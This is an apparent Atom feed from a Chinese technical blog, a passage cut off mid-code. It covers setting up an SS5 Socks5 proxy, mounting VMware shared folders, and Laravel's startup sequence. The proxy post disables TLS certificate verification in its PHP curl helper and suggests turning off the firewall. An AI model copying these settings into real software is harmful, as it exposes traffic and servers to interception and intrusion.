<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>e攻城狮</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ya2.top/"/>
  <updated>2021-06-16T02:27:47.701Z</updated>
  <id>http://ya2.top/</id>
  
  <author>
    <name>Mr.Gou</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>搭建Socks5代理</title>
    <link href="http://ya2.top/articles/%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86/"/>
    <id>http://ya2.top/articles/搭建Socks5代理/</id>
    <published>2021-06-05T15:29:32.000Z</published>
    <updated>2021-06-16T02:27:47.701Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做<a href="https://app.ya2.top/model/?from=article" target="_blank" rel="noopener">3D模型下载</a>时发现本地可以运行的代码放到服务器就跑不动了，抓包发现是服务器端无法访问三方接口，所以想到使用代理访问，同时记录下整个代理搭建过程。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul><li>下载： <a href="http://sourceforge.net/projects/ss5/files/" target="_blank" rel="noopener">http://sourceforge.net/projects/ss5/files/</a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf ss5-3.8.9-8.tar.gz</span><br><span class="line">cd ss5-3.8.9-8</span><br><span class="line">./configure //默认是1080端口，如果想改端口的话，./configure --with-defaultport=10900</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></li></ul><p>默认安装目录在：/etc/opt/ss5</p><p>若出现报错：</p><blockquote><p>configure: error: <strong>* Some of the headers weren’t found *</strong></p></blockquote><p>则 需要安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install pam-devel</span><br></pre></td></tr></table></figure><p>如果出现报错：</p><blockquote><p>SS5OpenLdap.c:29:18: fatal error: ldap.h: No such file or directory</p></blockquote><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openldap-devel</span><br></pre></td></tr></table></figure><ul><li>修改配置</li></ul><p>/etc/opt/ss5/ss5.conf内容全部删除，仅添加内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth 0.0.0.0/0 - u</span><br><span class="line">permit u 0.0.0.0/0 - 0.0.0.0/0 - - - - -</span><br></pre></td></tr></table></figure><ul><li>添加账户</li></ul><p>/etc/opt/ss5/ss5.passwd中添加用户名与密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss5 pass</span><br></pre></td></tr></table></figure><ul><li>启动socks5</li></ul><p>默认情况ss5文件没有执行权限，如果觉得使用sh来启动麻烦，那么按如下方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x /etc/rc.d/init.d/ss5</span><br><span class="line">chkconfig --add ss5 //可选</span><br><span class="line">chkconfig ss5 on //可选</span><br><span class="line">service ss5 start</span><br></pre></td></tr></table></figure><p>注意：如果你服务器开了防火墙不要忘了关掉，或者iptables里做下策略</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>通用规则: curl -x [schema]://[user]:[pass]@[host]:[post] [URI] (-v 查询执行过程)</p><ul><li>crul 版本 &gt;= 7.21.7 时使用命令:</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x socks5h://localhost:10800 http://www.google.com/</span><br></pre></td></tr></table></figure><ul><li>crul 版本 &gt;= 7.18.0 时使用命令:</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --socks5-hostname localhost:10800 http://www.google.com/</span><br></pre></td></tr></table></figure><p>许多工具在内部使用libcurl，或者在安装程序脚本中使用curl命令。如果很难修改命令行本身，可以使用环境变量设置代理。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env ALL_PROXY=socks5h://localhost:10800 PROGRAM [OPTION]...</span><br></pre></td></tr></table></figure><p>如果你想覆盖系统代理设置，你可能还需要设置两个额外的变量:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env http_proxy=socks5h://localhost:10800 HTTPS_PROXY=socks5h://localhost:10800 ALL_PROXY=socks5h://localhost:10800 PROGRAM [OPTION]...</span><br></pre></td></tr></table></figure><p>注意: <code>http_proxy</code>是<strong>小</strong>写的，其他两个是<strong>大</strong>写的。</p><p>在代码中使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_post</span><span class="params">($sUrl, $aData, $aHeader = null, $proxy = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $sUrl);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">10</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($proxy) &#123;</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); <span class="comment">// Sockes5代理</span></span><br><span class="line">curl_setopt($ch, CURLOPT_PROXY, HOST);    <span class="comment">// HOST：代理服务器</span></span><br><span class="line">curl_setopt($ch, CURLOPT_PROXYPORT, PORT);   <span class="comment">// PORT: 代理端口</span></span><br><span class="line">curl_setopt($ch, CURLOPT_PROXYUSERPWD, <span class="string">'USER:PASS'</span>);   <span class="comment">// USER: 账号  PASS:密码 (注意账号密码之间有一个 ':' )</span></span><br><span class="line">&#125;</span><br><span class="line">!is_null($aHeader) &amp;&amp; curl_setopt($ch, CURLOPT_HTTPHEADER, $aHeader);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $aData);</span><br><span class="line">$sResult = curl_exec($ch);</span><br><span class="line"><span class="keyword">if</span> ($sError = curl_error($ch)) &#123;</span><br><span class="line">response(curl_errno($ch), $sError);</span><br><span class="line">&#125;</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">return</span> $sResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在做&lt;a href=&quot;https://app.ya2.top/model/?from=article&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;3D模型下载&lt;/a&gt;时发现本地可以运行的代码放到服务器就跑不动了，抓包发现是服务器端无法访问三方接口，所
      
    
    </summary>
    
      <category term="服务器运维" scheme="http://ya2.top/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>vmware文件夹共享</title>
    <link href="http://ya2.top/articles/vmware%E6%96%87%E4%BB%B6%E5%A4%B9%E5%85%B1%E4%BA%AB/"/>
    <id>http://ya2.top/articles/vmware文件夹共享/</id>
    <published>2021-02-20T15:17:39.000Z</published>
    <updated>2021-06-16T02:21:42.965Z</updated>
    
    <content type="html"><![CDATA[<p>1.虚拟机设置 -&gt; 选项 -&gt; 共享文件夹 -&gt; 总是启用 -&gt; 选择宿主机要映射的目录 + 起个名字</p><p>接下来切换到linux</p><p>2.安装vm-tools</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> yum install -y open-vm-tools open-vm-tools-desktop</span></span><br></pre></td></tr></table></figure><p>安装完后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> vmware-hgfsclient</span></span><br></pre></td></tr></table></figure><p>就会看见我们刚刚映射的目录</p><p>我们先创建一个文件夹 再映射vmware共享文件夹到这个目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt/vm</span><br><span class="line">vmhgfs-fuse .host:/ /mnt/vm -o allow_other</span><br></pre></td></tr></table></figure><p>这时候我们就可以像正常linux下文件一样去操作 /mnt/vm 下的文件 改动会和window那边一致 说了废话 本来就是一份文件</p><p>我们再将 /mnt/vm 软链接到web目录即可<br>前面路径是 源路径 后面是目标路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /mnt/vm/wwwroot/ /www/</span><br></pre></td></tr></table></figure><p>然后创建站点，解析hosts<br>访问 一气呵成</p><p>linux重启后 会导致挂载失效，需要重新挂载 所以我们写到开机自启脚本里<br>给执行权限 centos7 默认 /etc/rc.d/rc.local 无执行权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p>打开/etc/rc.d/rc.local 在最下面加入挂载命令<br>自动挂载vmware宿主机的共享文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmhgfs-fuse .host:/ /mnt/vm -o allow_other</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.虚拟机设置 -&amp;gt; 选项 -&amp;gt; 共享文件夹 -&amp;gt; 总是启用 -&amp;gt; 选择宿主机要映射的目录 + 起个名字&lt;/p&gt;
&lt;p&gt;接下来切换到linux&lt;/p&gt;
&lt;p&gt;2.安装vm-tools&lt;/p&gt;
&lt;figure class=&quot;highlight shel
      
    
    </summary>
    
      <category term="服务器运维" scheme="http://ya2.top/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>Laravel 启动流程</title>
    <link href="http://ya2.top/articles/Laravel%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    <id>http://ya2.top/articles/Laravel启动流程/</id>
    <published>2021-02-03T13:54:46.000Z</published>
    <updated>2021-06-16T02:23:35.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-程序启动准备"><a href="#1-程序启动准备" class="headerlink" title="1. 程序启动准备"></a>1. 程序启动准备</h2><p>程序入口在 index.php 中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/../vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$app = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">'/../bootstrap/app.php'</span>;<span class="comment"># 获取服务容器实例</span></span><br><span class="line"></span><br><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$response-&gt;send();</span><br><span class="line"></span><br><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure><p><strong>创建服务容器实例</strong></p><p>服务容器的创建在 <code>bootstrap\app.php</code> 中进行.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$app = <span class="keyword">new</span> Illuminate\Foundation\Application(</span><br><span class="line">    realpath(<span class="keyword">__DIR__</span>.<span class="string">'/../'</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="1-1-容器基础配置"><a href="#1-1-容器基础配置" class="headerlink" title="1.1 容器基础配置"></a>1.1 容器基础配置</h3><p>容器 <code>Application</code> 的构造函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($basePath = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($basePath) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setBasePath($basePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;registerBaseBindings();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;registerBaseServiceProviders();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;registerCoreContainerAliases();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数 主要完成以下基本配置:</p><ul><li>目录路径(绑定到容器中, 并提供类方法获取子目录)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setBasePath</span><span class="params">($basePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;basePath = rtrim($basePath, <span class="string">'\/'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;bindPathsInContainer();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindPathsInContainer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path'</span>, <span class="keyword">$this</span>-&gt;path());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.base'</span>, <span class="keyword">$this</span>-&gt;basePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.lang'</span>, <span class="keyword">$this</span>-&gt;langPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.config'</span>, <span class="keyword">$this</span>-&gt;configPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.public'</span>, <span class="keyword">$this</span>-&gt;publicPath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.storage'</span>, <span class="keyword">$this</span>-&gt;storagePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.database'</span>, <span class="keyword">$this</span>-&gt;databasePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.resources'</span>, <span class="keyword">$this</span>-&gt;resourcePath());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.bootstrap'</span>, <span class="keyword">$this</span>-&gt;bootstrapPath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>绑定容器自身</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseBindings</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>::setInstance(<span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'app'</span>, <span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(Container::class, <span class="keyword">$this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(PackageManifest::class, <span class="keyword">new</span> PackageManifest(</span><br><span class="line">        <span class="keyword">new</span> Filesystem, <span class="keyword">$this</span>-&gt;basePath(), <span class="keyword">$this</span>-&gt;getCachedPackagesPath()</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>基础服务注册( Event, Log, Route)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseServiceProviders</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> EventServiceProvider(<span class="keyword">$this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> LogServiceProvider(<span class="keyword">$this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> RoutingServiceProvider(<span class="keyword">$this</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>别名注册</li></ul><p>多个接口名 对应一个简短别名, 后续在注册服务时只需绑定到别名上即可 (而不必绑定到具体接口名)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerCoreContainerAliases</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ([</span><br><span class="line">        <span class="string">'app'</span>                  =&gt; [\Illuminate\Foundation\Application::class, \Illuminate\Contracts\Container\Container::class, \Illuminate\Contracts\Foundation\Application::class,  \Psr\Container\ContainerInterface::class],</span><br><span class="line">        <span class="string">'auth'</span>                 =&gt; [\Illuminate\Auth\AuthManager::class, \Illuminate\Contracts\Auth\Factory::class],</span><br><span class="line">        <span class="string">'auth.driver'</span>          =&gt; [\Illuminate\Contracts\Auth\Guard::class],</span><br><span class="line">        <span class="string">'blade.compiler'</span>       =&gt; [\Illuminate\View\Compilers\BladeCompiler::class],</span><br><span class="line">        <span class="string">'cache'</span>                =&gt; [\Illuminate\Cache\CacheManager::class, \Illuminate\Contracts\Cache\Factory::class],</span><br><span class="line">        <span class="string">'cache.store'</span>          =&gt; [\Illuminate\Cache\Repository::class, \Illuminate\Contracts\Cache\Repository::class],</span><br><span class="line">        <span class="string">'config'</span>               =&gt; [\Illuminate\Config\Repository::class, \Illuminate\Contracts\Config\Repository::class],</span><br><span class="line">        <span class="string">'cookie'</span>               =&gt; [\Illuminate\Cookie\CookieJar::class, \Illuminate\Contracts\Cookie\Factory::class, \Illuminate\Contracts\Cookie\QueueingFactory::class],</span><br><span class="line">        <span class="string">'encrypter'</span>            =&gt; [\Illuminate\Encryption\Encrypter::class, \Illuminate\Contracts\Encryption\Encrypter::class],</span><br><span class="line">        <span class="string">'db'</span>                   =&gt; [\Illuminate\Database\DatabaseManager::class],</span><br><span class="line">        <span class="string">'db.connection'</span>        =&gt; [\Illuminate\Database\Connection::class, \Illuminate\Database\ConnectionInterface::class],</span><br><span class="line">        <span class="string">'events'</span>               =&gt; [\Illuminate\Events\Dispatcher::class, \Illuminate\Contracts\Events\Dispatcher::class],</span><br><span class="line">        <span class="string">'files'</span>                =&gt; [\Illuminate\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem'</span>           =&gt; [\Illuminate\Filesystem\FilesystemManager::class, \Illuminate\Contracts\Filesystem\Factory::class],</span><br><span class="line">        <span class="string">'filesystem.disk'</span>      =&gt; [\Illuminate\Contracts\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem.cloud'</span>     =&gt; [\Illuminate\Contracts\Filesystem\Cloud::class],</span><br><span class="line">        <span class="string">'hash'</span>                 =&gt; [\Illuminate\Contracts\Hashing\Hasher::class],</span><br><span class="line">        <span class="string">'translator'</span>           =&gt; [\Illuminate\Translation\Translator::class, \Illuminate\Contracts\Translation\Translator::class],</span><br><span class="line">        <span class="string">'log'</span>                  =&gt; [\Illuminate\Log\Writer::class, \Illuminate\Contracts\Logging\Log::class, \Psr\Log\LoggerInterface::class],</span><br><span class="line">        <span class="string">'mailer'</span>               =&gt; [\Illuminate\Mail\Mailer::class, \Illuminate\Contracts\Mail\Mailer::class, \Illuminate\Contracts\Mail\MailQueue::class],</span><br><span class="line">        <span class="string">'auth.password'</span>        =&gt; [\Illuminate\Auth\Passwords\PasswordBrokerManager::class, \Illuminate\Contracts\Auth\PasswordBrokerFactory::class],</span><br><span class="line">        <span class="string">'auth.password.broker'</span> =&gt; [\Illuminate\Auth\Passwords\PasswordBroker::class, \Illuminate\Contracts\Auth\PasswordBroker::class],</span><br><span class="line">        <span class="string">'queue'</span>                =&gt; [\Illuminate\Queue\QueueManager::class, \Illuminate\Contracts\Queue\Factory::class, \Illuminate\Contracts\Queue\Monitor::class],</span><br><span class="line">        <span class="string">'queue.connection'</span>     =&gt; [\Illuminate\Contracts\Queue\Queue::class],</span><br><span class="line">        <span class="string">'queue.failer'</span>         =&gt; [\Illuminate\Queue\Failed\FailedJobProviderInterface::class],</span><br><span class="line">        <span class="string">'redirect'</span>             =&gt; [\Illuminate\Routing\Redirector::class],</span><br><span class="line">        <span class="string">'redis'</span>                =&gt; [\Illuminate\Redis\RedisManager::class, \Illuminate\Contracts\Redis\Factory::class],</span><br><span class="line">        <span class="string">'request'</span>              =&gt; [\Illuminate\Http\Request::class, \Symfony\Component\HttpFoundation\Request::class],</span><br><span class="line">        <span class="string">'router'</span>               =&gt; [\Illuminate\Routing\Router::class, \Illuminate\Contracts\Routing\Registrar::class, \Illuminate\Contracts\Routing\BindingRegistrar::class],</span><br><span class="line">        <span class="string">'session'</span>              =&gt; [\Illuminate\Session\SessionManager::class],</span><br><span class="line">        <span class="string">'session.store'</span>        =&gt; [\Illuminate\Session\Store::class, \Illuminate\Contracts\Session\Session::class],</span><br><span class="line">        <span class="string">'url'</span>                  =&gt; [\Illuminate\Routing\UrlGenerator::class, \Illuminate\Contracts\Routing\UrlGenerator::class],</span><br><span class="line">        <span class="string">'validator'</span>            =&gt; [\Illuminate\Validation\Factory::class, \Illuminate\Contracts\Validation\Factory::class],</span><br><span class="line">        <span class="string">'view'</span>                 =&gt; [\Illuminate\View\Factory::class, \Illuminate\Contracts\View\Factory::class],</span><br><span class="line">    ] <span class="keyword">as</span> $key =&gt; $aliases) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($aliases <span class="keyword">as</span> $alias) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;alias($key, $alias);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-核心类绑定"><a href="#1-2-核心类绑定" class="headerlink" title="1.2 核心类绑定"></a>1.2 核心类绑定</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Http\Kernel::class,</span><br><span class="line">    App\Http\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Console\Kernel::class,</span><br><span class="line">    App\Console\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Debug\ExceptionHandler::class,</span><br><span class="line">    App\Exceptions\Handler::class</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>绑定重要接口:</strong></p><ul><li>Http 核心类</li><li>命令行 核心类</li><li>异常处理类</li></ul><h3 id="1-3-实例化Http核心类"><a href="#1-3-实例化Http核心类" class="headerlink" title="1.3 实例化Http核心类"></a>1.3 实例化Http核心类</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br></pre></td></tr></table></figure><p>Http 核心类的构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Application $app, Router $router)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;router = $router;</span><br><span class="line"></span><br><span class="line">    $router-&gt;middlewarePriority = <span class="keyword">$this</span>-&gt;middlewarePriority;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;middlewareGroups <span class="keyword">as</span> $key =&gt; $middleware) &#123;</span><br><span class="line">        $router-&gt;middlewareGroup($key, $middleware);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;routeMiddleware <span class="keyword">as</span> $key =&gt; $middleware) &#123;</span><br><span class="line">        $router-&gt;aliasMiddleware($key, $middleware);</span><br><span class="line">    &#125;</span><br><span 